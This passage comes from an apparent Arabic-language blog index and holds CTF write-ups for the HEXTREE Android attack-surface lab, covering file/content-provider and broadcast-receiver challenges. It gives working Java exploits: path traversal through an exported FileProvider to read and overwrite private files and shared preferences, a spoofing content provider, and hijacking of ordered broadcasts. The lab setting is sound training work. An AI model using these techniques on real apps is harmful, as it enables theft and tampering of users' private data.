(stringExtra != null) { prepareFlag(this, stringExtra); Uri uriForFile = FileProvider.getUriForFile(this, \u0026#34;io.hextree.root\u0026#34;, new File(getFilesDir(), stringExtra)); Intent intent = new Intent(); intent.setData(uriForFile); intent.addFlags(3); setResult(0, intent); return; } Uri uriForFile2 = FileProvider.getUriForFile(this, \u0026#34;io.hextree.root\u0026#34;, new File(getFilesDir(), \u0026#34;secret.txt\u0026#34;)); Intent intent2 = new Intent(); intent2.setData(uriForFile2); intent2.addFlags(3); setResult(-1, intent2); } void prepareFlag(Context context, String str) { if (str.contains(\u0026#34;flag35.txt\u0026#34;) \u0026amp;\u0026amp; new File(getFilesDir(), str).exists()) { LogHelper logHelper = new LogHelper(context); logHelper.addTag(\u0026#34;flag35\u0026#34;); logHelper.addTag(\u0026#34;root-provider\u0026#34;); Utils.writeFile2(this, \u0026#34;flag35.txt\u0026#34;, logHelper.appendLog(FLAG)); } } } ال activity بيتعامل مع مشاركة الملفات عبر FileProvider لما الأول بيشيك إذا intent extra اسمه \u0026ldquo;filename\u0026rdquo; كان موجود. لو آه، بيشغل prepareFlag() مع الـ filename ده، ينشئ URI للملف باستخدام FileProvider، ينشئ intent مع الـ URI ده، يحط flags، ويرجع result code بـ 0 (نجاح).\nالـ prepareFlag() method بيشيك إذا الـ filename هو \u0026ldquo;flag35.txt\u0026rdquo; ولو الملف موجود. لو كده، بيسجل tags ويكتب flag في الملف.\nلو مفيش filename اتقدم (stringExtra هو null) بيستخدم \u0026ldquo;secret.txt\u0026rdquo; افتراضياً، ينشئ URI للملف ده، ينشئ intent مع الـ URI ده، يحط flags، ويرجع result code بـ -1 (فشل أو default case).\nنقدر نبعت intent وهنا بيدور على filename وبعدين يحضر الـ flag في ملف flag35.txt\nالحل #\rلو نشوف الـ uri اللي هيتستخدم للوصول لـ secret.txt URI: content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/files/secret.txt\nو نجرب طلب بـ intent.putExtra(\u0026quot;filename\u0026quot;,\u0026quot;flag35.txt\u0026quot;) URI: content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/files/flag35.txt\nإحنا بندور جوا مجلد files؟ فعشان نخرج من الملف نقدر زي ما بنعمل عادة في أي terminal، ناخد خطوة لورا باستخدام ..\nIntent intent = new Intent(); intent.putExtra(\u0026#34;filename\u0026#34;,\u0026#34;../flag35.txt\u0026#34;); // لو عايز secret ماتستخدمهوش intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag35Activity\u0026#34;)); startActivityForResult(intent,1); if (requestCode == 1) { Log.d(\u0026#34;Hextree\u0026#34;,\u0026#34;URI: \u0026#34;+ data.getData().toString()); try { InputStream inputStream = getContentResolver().openInputStream(data.getData()); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line ; while ((line = reader.readLine()) != null) { Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*]\u0026#34; + line); } } catch (FileNotFoundException e) { throw new RuntimeException(e); } catch (IOException e) { throw new RuntimeException(e); } } وبعدين اضغط done وشوف السحر\nFlag 36 #\rتحليل الكود #\rif (Flag36Preferences.getBoolean(\u0026#34;solved\u0026#34;, false)) { this.f.addTag(Flag36Preferences.class); success(this); } else { Log.i(\u0026#34;Flag36\u0026#34;, \u0026#34;not solved\u0026#34;); } لو الـ shared preferences اسمها Flag36Preferences ولو عندها قيمة اسمها solved محطوطة على true نجيب الـ flag بتاعنا بس إيه هو الـ shared preference ده؟\n[!info] الـ SharedPreferences هو object بيشاور على ملف فيه key-value pairs (مفتاح او علامه و القيمة البتدل عليها) وبيدي methods بسيطة عشان نقرأ ونكتب فيهم. كل ملف SharedPreferences بيتعامل معاه الـ framework ونقدر نخليه private أو اي حد يستخدمة shared . و بيتحفظ بصيغة xml\n\u0026hellip; ماذا بعد؟\nالحل #\rفي flag35 مش بس عندنا permission للقراءة لا وكمان للكتابة، وبما إن الـ provider ده بيستخدم عنوان root نقدر نروح لمكان الـ shared preference ده ونفتح ونعدل الملف وبعدين لازم نقفل الـ app ونفتحه تاني عشان التغييرات تبان\nIntent intent = new Intent(); intent.putExtra(\u0026#34;filename\u0026#34;,\u0026#34;../shared_prefs/Flag36Preferences.xml\u0026#34;); // لو عايز secret ماتستخدمهوش intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.activities.Flag35Activity\u0026#34;)); startActivityForResult(intent,2); if (requestCode == 2) { Log.d(\u0026#34;Hextree\u0026#34;,\u0026#34;URI: \u0026#34;+ data.getData().toString()); try { InputStream inputStream = getContentResolver().openInputStream(data.getData()); StringBuilder stringBuilder = new StringBuilder(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = reader.readLine()) != null) { Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*]\u0026#34; + line); if (line.contains(\u0026#34;false\u0026#34;)) { Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*] /* قوانين جديدة يا صاحبي *\\\\\u0026#34;); line = line.replace(\u0026#34;false\u0026#34;, \u0026#34;true\u0026#34;); Log.d(\u0026#34;File\u0026#34;, \u0026#34;[*]\u0026#34; + line); } stringBuilder.append(line).append(\u0026#34;\\n\u0026#34;); } reader.close(); // كتابة المحتوى المعدل في الملف تاني OutputStream outputStream = getContentResolver().openOutputStream(data.getData()); outputStream.write(stringBuilder.toString().getBytes()); outputStream.close(); } catch (FileNotFoundException e) { throw new RuntimeException(e); } catch (IOException e) { throw new RuntimeException(e); } } Flag 37 #\rتحليل الكود #\r@Override protected void onCreate(Bundle bundle) { super.onCreate(bundle); this.f = new LogHelper(this); Uri data = getIntent().getData(); if (data == null) { return; } try (Cursor cursor = getContentResolver().query(data, null, null, null, null)) { if (cursor == null || !cursor.moveToFirst()) { return; } // استخراج metadata الملف String fileName = cursor.getString(cursor.getColumnIndex(\u0026#34;_display_name\u0026#34;)); long fileSize = cursor.getLong(cursor.getColumnIndex(\u0026#34;_size\u0026#34;)); this.f.addTag(fileSize); this.f.addTag(fileName); // شيك إذا كان الـ flag file الصح if (!\u0026#34;../flag37.txt\u0026#34;.equals(fileName) || fileSize != 1337) { Log.i(\u0026#34;Flag37\u0026#34;, \u0026#34;اسم الملف \u0026#39;\u0026#34; + fileName + \u0026#34;\u0026#39; أو الحجم \u0026#39;\u0026#34; + fileSize + \u0026#34;\u0026#39; مش مطابق\u0026#34;); return; } // قراءة محتوى الملف try (InputStream inputStream = getContentResolver().openInputStream(data); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) { StringBuilder fileContent = new StringBuilder(); String line; while ((line = reader.readLine()) != null) { fileContent.append(line); } this.f.addTag(fileContent.toString()); if (\u0026#34;give flag\u0026#34;.equals(fileContent.toString())) { success(this); } else { Log.i(\u0026#34;Flag37\u0026#34;, \u0026#34;محتوى الملف \u0026#39;\u0026#34; + fileContent + \u0026#34;\u0026#39; مش \u0026#39;give flag\u0026#39;\u0026#34;); } } } catch (Exception e) { Log.e(\u0026#34;Flag37\u0026#34;, \u0026#34;خطأ في معالجة الملف\u0026#34;, e); } } هنا الـ activity بيجيب intent وياخد الـ URI اللي فيه ويستخدمه عشان يشغل provider، وبعدين يشيك إذا الملف اسمه \u0026ldquo;../flag37.txt\u0026rdquo; وحجمه بالضبط 1337 bytes لو true بيفتح input stream (طريق تقدر تستقبل بيه بيانات) عشان يقرأ الملف ويقرأ كل محتوى الملف في StringBuilder ويشيك إذا المحتوى بالضبط \u0026quot;give flag\u0026quot; لو مطابق، بيشغل success() ولو لأ، بيسجل إن المحتوى مش مطابق\nالحل #\rهنا لازم ننشئ content provider بتاعنا مع المتطلبات وبعدين نضغط على activity الـ flag من الـ app\nالـ Flag 37 activity بيعمل الفحوصات المحددة دي:\nبيعمل query لـ content provider عبر الـ URI من الـ intent بيستخرج metadata من الـ cursor: أعمدة _display_name و _size بيتأكد من اسم الملف لازم يكون بالضبط \u0026quot;flag37.txt/..\u0026quot; بيتأكد من حجم الملف لازم يكون بالضبط 1337 bytes بيقرأ محتوى الملف باستخدام openInputStream() بيشيك إذا المحتوى يساوي بالضبط \u0026quot;give flag\u0026quot; الـ custom content provider اللي هيـ:\nيرجع الـ metadata الصح في method الـ query() يدي محتوى الملف بالضبط عبر openInputStream() أو openFile() يتأكد إن المحتوى بالضبط 1337 bytes (مع padding) \u0026lt;provider android:name=\u0026#34;.AttackProvider\u0026#34; android:authorities=\u0026#34;ItsFadinG.github.io\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt;\u0026lt;/provider\u0026gt; public class AttackProvider extends ContentProvider { public AttackProvider() { } @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;query(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); MatrixCursor cursor = new MatrixCursor(new String[]{ OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE }); cursor.addRow(new Object[]{ \u0026#34;../flag37.txt\u0026#34;, 1337 }); return cursor; } @Override public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;openFile(\u0026#34; + uri.toString() + \u0026#34;)\u0026#34;); try { ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe(); ParcelFileDescriptor.AutoCloseOutputStream outputStream = new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]); new Thread(() -\u0026gt; { try { outputStream.write(\u0026#34;give flag\u0026#34;.getBytes()); outputStream.close(); } catch (IOException e) { Log.e(\u0026#34;AttackProvider\u0026#34;, \u0026#34;خطأ في pipeToParcelFileDescriptor\u0026#34;, e); } }).start(); return pipe[0]; } catch (IOException e) { throw new FileNotFoundException(\u0026#34;ما قدرش يفتح pipe لـ: \u0026#34; + uri.toString()); } } @Override public int delete(Uri uri, String selection, String[] selectionArgs) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;delete(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); throw new UnsupportedOperationException(\u0026#34;لسه مش متعمل\u0026#34;); } @Override public String getType(Uri uri) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;getType(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); throw new UnsupportedOperationException(\u0026#34;لسه مش متعمل\u0026#34;); } @Override public Uri insert(Uri uri, ContentValues values) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;insert(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); throw new UnsupportedOperationException(\u0026#34;لسه مش متعمل\u0026#34;); } @Override public boolean onCreate() { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;onCreate()\u0026#34;); return true; } @Override public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) { Log.i(\u0026#34;AttackProvider\u0026#34;, \u0026#34;update(\u0026#34;+uri.toString()+\u0026#34;)\u0026#34;); throw new UnsupportedOperationException(\u0026#34;لسه مش متعمل\u0026#34;); } } ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/posts/ctf/mobile/hex/hex_provider/","section":"Posts","summary":"","title":"تحديات HEX Tree Content \u0026 File providers","type":"posts"},{"content":"","date":"14 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/broadcast/","section":"Tags","summary":"","title":"Broadcast","type":"tags"},{"content":"\rFlag 16 #\rتحليل الكود #\r\u0026lt;activity android:name=\u0026#34;io.hextree.attacksurface.activities.Flag16Activity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;receiver android:name=\u0026#34;io.hextree.attacksurface.receivers.Flag16Receiver\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; بداية غير مبشرة \u0026gt;: الـ activity مش exported يعني منقدرش نستدعيه و نتعامل معاه بشكل مباشر، بس الحمد لله في receiver معمول.\nReceiver:\npublic static String FlagSecret = \u0026#34;give-flag-16\u0026#34;; public void onReceive(Context context, Intent intent) { if (intent.getStringExtra(\u0026#34;flag\u0026#34;).equals(FlagSecret)) { success(context, FlagSecret); } } هنا الـ broadcast اللي هنبعته لازم يكون فيه flag بالقيمة give-flag-16 عشان الـ method success تشتغل.\nالحل #\rIntent intent = new Intent(); intent.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;,\u0026#34;io.hextree.attacksurface.receivers.Flag16Receiver\u0026#34;); intent.putExtra(\u0026#34;flag\u0026#34;,\u0026#34;give-flag-16\u0026#34;); sendBroadcast(intent); وأيوة بس كدة.\nFlag 17 #\rتحليل الكود #\rpublic static String FlagSecret = \u0026#34;give-flag-17\u0026#34;; public void onReceive(Context context, Intent intent) { Log.i(\u0026#34;Flag17Receiver.onReceive\u0026#34;, Utils.dumpIntent(context, intent)); if (isOrderedBroadcast()) { if (intent.getStringExtra(\u0026#34;flag\u0026#34;).equals(FlagSecret)) { success(context, FlagSecret); return; } Bundle bundle = new Bundle(); bundle.putBoolean(\u0026#34;success\u0026#34;, false); setResult(0, \u0026#34;Flag 17 Completed\u0026#34;, bundle); } } الموضوع زي اللي فات بس محتاجين نبعته كـ ordered broadcast ؟\nNon-ordered vs. Ordered Broadcasts #\rفي الـ non-ordered mode، الـ broadcasts بتتبعت لكل الـ receivers المهتمة \u0026ldquo;في نفس الوقت\u0026rdquo;. يعني مافيش receiver يقدر يتدخل أو يمنع غيره من الشغل. مثال على كده الـ ACTION_BATTERY_LOW.\nفي الـ ordered mode، الـ broadcasts بتتبعت لكل receiver بالترتيب (حسب الـ android:priority attribute للـ intent-filter element في الـ manifest file) وممكن receiver يوقف الـ broadcast فالـ receivers اللي أولويتها أقل مش هتاخده (مش هتشتغل خالص). مثال على النوع ده الـ ACTION_NEW_OUTGOING_CALL.\nالحل #\rIntent intent = new Intent(); intent.putExtra(\u0026#34;flag\u0026#34;,\u0026#34;give-flag-17\u0026#34;); intent.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;,\u0026#34;io.hextree.attacksurface.receivers.Flag17Receiver\u0026#34;); sendOrderedBroadcast(intent, null); Flag 18 #\rتحليل الكود #\rpublic static String SECRET_FLAG = \u0026#34;giving-out-flags\u0026#34;; public void onCreate(Bundle bundle) { Intent intent = new Intent(\u0026#34;io.hextree.broadcast.FREE_FLAG\u0026#34;); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); intent.addFlags(8); sendOrderedBroadcast(intent, null, new BroadcastReceiver() { @Override // android.content.BroadcastReceiver public void onReceive(Context context, Intent intent2) { String resultData = getResultData(); Bundle resultExtras = getResultExtras(false); int resultCode = getResultCode(); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultData \u0026#34; + resultData); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultExtras \u0026#34; + resultExtras); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultCode \u0026#34; + resultCode); if (resultCode != 0) { Utils.showIntentDialog(context, \u0026#34;BroadcastReceiver.onReceive\u0026#34;, intent2); Flag18Activity flag18Activity = Flag18Activity.this; flag18Activity.success(flag18Activity); } } }, null, 0, null, null); الـ activity ده هيبعت ordered broadcast بالـ action \u0026quot;io.hextree.broadcast.FREE_FLAG\u0026quot; ويستنى رد، ولما يجيله النتيجة، رقم اسمه resultCode بيتشيك لو مش صفر، لو صح ف هنجيب العلم\nالحل #\rيعني محتاجين نعمل receiver بالـ filter الصح ونعمل setResultCode يا إما ok أو نحط رقم.\nBroadcastReceiver hijacker = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { setResultCode(Activity.RESULT_OK); setResultData(\u0026#34;Intercepted!\u0026#34;); } }; IntentFilter filter = new IntentFilter(\u0026#34;io.hextree.broadcast.FREE_FLAG\u0026#34;); filter.setPriority(999); // عشان نكون أول واحد ياخذ البث لو فيه تطبيقات ثانية registerReceiver(hijacker, filter, null, null); أو نعمل receiver في سطر واحد بس:\nregisterReceiver(hijacker, new IntentFilter(\u0026#34;io.hextree.broadcast.FREE_FLAG\u0026#34;)); Flag 19 #\rتحليل الكود #\rpublic void onReceive(Context context, Intent intent) { Bundle bundleExtra; String action = intent.getAction(); if (action == null || !action.contains(\u0026#34;APPWIDGET_UPDATE\u0026#34;) || (bundleExtra = intent.getBundleExtra(\u0026#34;appWidgetOptions\u0026#34;)) == null) { return; } int i = bundleExtra.getInt(\u0026#34;appWidgetMaxHeight\u0026#34;, -1); int i2 = bundleExtra.getInt(\u0026#34;appWidgetMinHeight\u0026#34;, -1); if (i == 1094795585 \u0026amp;\u0026amp; i2 == 322376503) { success(context); } } هنا الـ widget بياخد intent من broadcast ويشيك لو في action APPWIDGET_UPDATE ومعاه Extra data: i = 1094795585 \u0026amp; i2 = 322376503\nالحل #\rيعني هنعمل متغير من نوع Bundle ونديله الـ data ونحط الـ action الصح:\nIntent intent = new Intent(); intent.setComponent(new ComponentName(\u0026#34;io.hextree.attacksurface\u0026#34;,\u0026#34;io.hextree.attacksurface.receivers.Flag19Widget\u0026#34; )); Bundle bundle = new Bundle(); options.putInt(\u0026#34;appWidgetMaxHeight\u0026#34;, 1094795585); options.putInt(\u0026#34;appWidgetMinHeight\u0026#34;, 322376503); intent.putExtra(\u0026#34;appWidgetOptions\u0026#34;, bundle); intent.setAction(\u0026#34;APPWIDGET_UPDATE\u0026#34;); sendBroadcast(intent); Flag 20 #\rتحليل الكود #\rpublic static String GET_FLAG = \u0026#34;io.hextree.broadcast.GET_FLAG\u0026#34;; public void onCreate(Bundle bundle) { if (intent == null) { return; } Intent intent = getIntent(); String action = intent.getAction(); if (action != null \u0026amp;\u0026amp; action.equals(GET_FLAG)) { success(this); return; } Flag20Receiver flag20Receiver = new Flag20Receiver(); IntentFilter intentFilter = new IntentFilter(GET_FLAG); registerReceiver(flag20Receiver, intentFilter); } ده بيسجل receiver للـ io.hextree.broadcast.GET_FLAG action ولما يجيله intent مش فاضي بالـ action ده هنقدر نجيب الـ Flag.\nالحل #\rIntent intent = new Intent(); intent.setAction(\u0026#34;io.hextree.broadcast.GET_FLAG\u0026#34;); intent.putExtra(\u0026#34;give-flag\u0026#34;, true); // أي data sendBroadcast(intent); Flag 21 #\rتحليل الكود #\rجزء الـ Notification:\n// إنشاء قناة إشعارات private void createNotificationChannel() { // الإشعارات لازم تكون لها قناة زي قنوات التلفزيون NotificationChannel notificationChannel = new NotificationChannel( \u0026#34;CHANNEL_ID\u0026#34;, // معرف القناة \u0026#34;Hextree Notifications\u0026#34;, // اسم يشوفه المستخدم NotificationManager.IMPORTANCE_DEFAULT // مستوى الأهمية (يأثر على الصوت والظهور) ); notificationChannel.setDescription(\u0026#34;إشعارات تتعلق بخصائص الأمان.\u0026#34;); // إنشاء القناة فعليًا NotificationManager manager = getSystemService(NotificationManager.class); manager.createNotificationChannel(notificationChannel); } // في onCreate(): // إنشاء وإظهار إشعار مع زر أكشن createNotificationChannel(); // تحضير إنتنت البث (زي تحضير رسالة للإرسال) Intent intent = new Intent(GIVE_FLAG); intent.putExtra(\u0026#34;flag\u0026#34;, this.f.appendLog(this.flag)); // إضافة بيانات إضافية (العلم) // لف الإنتنت في PendingIntent (يسمح بالتنفيذ في الخلفية) PendingIntent pendingIntent = PendingIntent.getBroadcast( this, 0, // كود الطلب (ما يستخدم هنا) intent, PendingIntent.FLAG_IMMUTABLE // علم أمان (مطلوب لأندرويد 12+) ); // بناء الإشعار NotificationCompat.Builder notification = new NotificationCompat.Builder(this, \u0026#34;CHANNEL_ID\u0026#34;) .setSmallIcon(R.drawable.hextree_logo) // أيقونة صغيرة في شريط الحالة .setContentTitle(this.name) // عنوان الإشعار .setContentText(\u0026#34;Reverse engineer classes Flag21Activity\u0026#34;) // الوصف .setPriority(NotificationCompat.PRIORITY_DEFAULT) // مستوى الأولوية .setAutoCancel(true) // يختفي لما نضغط عليه .addAction( // إضافة زر للإشعار R.drawable.hextree_logo, // أيقونة الزر \u0026#34;Give Flag\u0026#34;, // نص الزر pendingIntent // إيش يصير لما نضغط (يرسل بث) ); // شيك على الإذن وإظهار الإشعار if (ActivityCompat.checkSelfPermission(this, \u0026#34;android.permission.POST_NOTIFICATIONS\u0026#34;) != 0) { NotificationManagerCompat.from(this).notify(1, notification.build()); Toast.makeText(this, \u0026#34;شيك على الإشعارات بتاعتك\u0026#34;, 0).show(); } الـ notification فيها زرار لما نضغط عليه بيعمل broadcast. الـ broadcast ده فيه \u0026ldquo;flag\u0026rdquo; مخفي و الـ receiver (الجزء التاني) بيمسك الـ broadcast ده ويشتغل عليه. Android 13 و ما فوق محتاج إذن صريح لـ notifications عشان تشتغل.\nجزء الـ Receiver:\n//Flag21Activity.class // Broadcast Receiver implementation private BroadcastReceiver broadcastReceiver = new BroadcastReceiver() { @Override public void onReceive(Context context, Intent intent) { // Get broadcast results String resultData = getResultData(); Bundle resultExtras = getResultExtras(false); int resultCode = getResultCode(); // Log the results Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultData \u0026#34; + resultData); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultExtras \u0026#34; + resultExtras); Log.i(\u0026#34;Flag18Activity.BroadcastReceiver\u0026#34;, \u0026#34;resultCode \u0026#34; + resultCode); // Show toast and handle success Toast.makeText(context, \u0026#34;Check the broadcast intent for the flag\u0026#34;, 0).show(); Flag21Activity flag21Activity = Flag21Activity.this; flag21Activity.success(null, flag21Activity); } }; // In onCreate(): // Register the broadcast receiver this.f.addTag(GIVE_FLAG); IntentFilter intentFilter = new IntentFilter(GIVE_FLAG); registerReceiver(broadcastReceiver, intentFilter); الـ receiver مستني broadcast بالـ action GIVE_FLAG. لما يوصله، بيعمل log للـ data ويظهر Toast وبعدين الـ success بتشتغل.\nالحل #\rبعد ما نضغط على الـ activity عشان ننشئ الـ notification، عملت نفس اللي الزرار في الـ notification المفروض يبعته وخلاص:\nIntent intent = new Intent(); intent.setAction(\u0026#34;io.hextree.broadcast.GIVE_FLAG\u0026#34;); sendBroadcast(intent); ","date":"14 يوليو 2025","externalUrl":null,"permalink":"/superBLog/ar/posts/ctf/mobile/hex/hex_broadcast/","section":"Posts","summary":"","title":"HEX Tree Broadcast تحديات","type":"posts"},{"content":"","externalUrl":null,"permalink":"/superBLog/ar/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/superBLog/ar/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/superBLog/ar/series/","section":"Series","summary":"","title":"Series","type":"series"}]